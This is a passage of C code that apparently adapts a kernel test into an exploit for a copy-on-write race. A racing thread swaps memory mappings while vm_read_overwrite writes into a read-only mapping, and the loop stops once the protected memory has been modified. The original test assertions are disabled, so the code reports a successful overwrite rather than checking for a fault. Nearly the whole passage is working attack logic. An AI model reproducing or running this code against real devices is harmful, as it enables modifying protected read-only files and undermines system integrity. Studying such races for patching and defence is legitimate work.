    kr = f_vm_deallocate(f_mach_task_self(), tmp_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_deallocate() tmp_addr 0x%llx"), (uint64_t)tmp_addr);
    tmp_addr = 0;

    f_pthread_mutex_lock(&ctx->mtx);

    /* start racing thread */
    ret = f_pthread_create(&th, NULL, switcheroo_thread, ctx); 
    // return false;    //YYY
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, CSTR("pthread_create")); 

    /* wait for racing thread to be ready to run */
    f_dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);

    duration = 10; /* 10 seconds */
    for (start = f_time(NULL), loops = 0;
        f_time(NULL) < start + duration;
        loops++) {
        /* reserve space for our 2 contiguous allocations */
        e2 = 0;
        kr = f_vm_allocate(f_mach_task_self(),
            &e2,
            2 * ctx->obj_size,
            VM_FLAGS_ANYWHERE);
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_allocate to reserve e2+e0"));

        /* make 1st allocation in our reserved space */
        kr = f_vm_allocate(f_mach_task_self(),
            &e2,
            ctx->obj_size,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_allocate e2"));
        /* initialize to 'B' */
        f_memset((char *)e2, 'B', ctx->obj_size);

        /* map our read-only target memory right after */
        ctx->e0 = e2 + ctx->obj_size;
        kr = f_vm_map(f_mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, CSTR(" vm_map() mem_entry_ro"));

        /* let the racing thread go */
        f_pthread_mutex_unlock(&ctx->mtx);
        /* wait a little bit */
        f_usleep(100);

        /* trigger copy_unaligned while racing with other thread */
        kr = f_vm_read_overwrite(f_mach_task_self(),
            e5,
            ctx->obj_size - 1 + overwrite_length,
            e2 + 1,
            &copied_size);
        T_QUIET;
        T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
            CSTR("vm_read_overwrite kr %d"), kr);
        switch (kr) {
        case KERN_SUCCESS:
            /* the target was RW */
            kern_success++;
            break;
        case KERN_PROTECTION_FAILURE:
            /* the target was RO */
            kern_protection_failure++;
            break;
        default:
            /* should not happen */
            kern_other++;
            break;
        }
        /* check that our read-only memory was not modified */
#if 0
        T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");
#endif
        bool is_still_equal = ((char *)ro_addr)[overwrite_first_diff_offset] == overwrite_first_diff_value;

        /* tell racing thread to stop toggling mappings */
        f_pthread_mutex_lock(&ctx->mtx);

        /* clean up before next loop */
        f_vm_deallocate(f_mach_task_self(), ctx->e0, ctx->obj_size);
        ctx->e0 = 0;
        f_vm_deallocate(f_mach_task_self(), e2, ctx->obj_size);
        e2 = 0;
        if (!is_still_equal) {
            retval = true;
            // fprintf(stderr, "RO mapping was modified\n");
            break;
        }
    }

    ctx->done = true;
    f_pthread_mutex_unlock(&ctx->mtx);
    f_pthread_join(th, NULL);
    
    if (unmapAtEnd) {
        f_munmap(file_mapped, ctx->obj_size);
    }


    kr = f_mach_port_deallocate(f_mach_task_self(), ctx->mem_entry_rw);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("mach_port_deallocate(me_rw)"));
    kr = f_mach_port_deallocate(f_mach_task_self(), ctx->mem_entry_ro);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("mach_port_deallocate(me_ro)"));
    kr = f_vm_deallocate(f_mach_task_self(), ro_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_deallocate(ro_addr)"));
    kr = f_vm_deallocate(f_mach_task_self(), e5, ctx->obj_size * 2);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, CSTR("vm_deallocate(e5)"));

#if 0
    T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
        kern_success, kern_protection_failure, kern_other);
    T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
#endif
    return retval;
}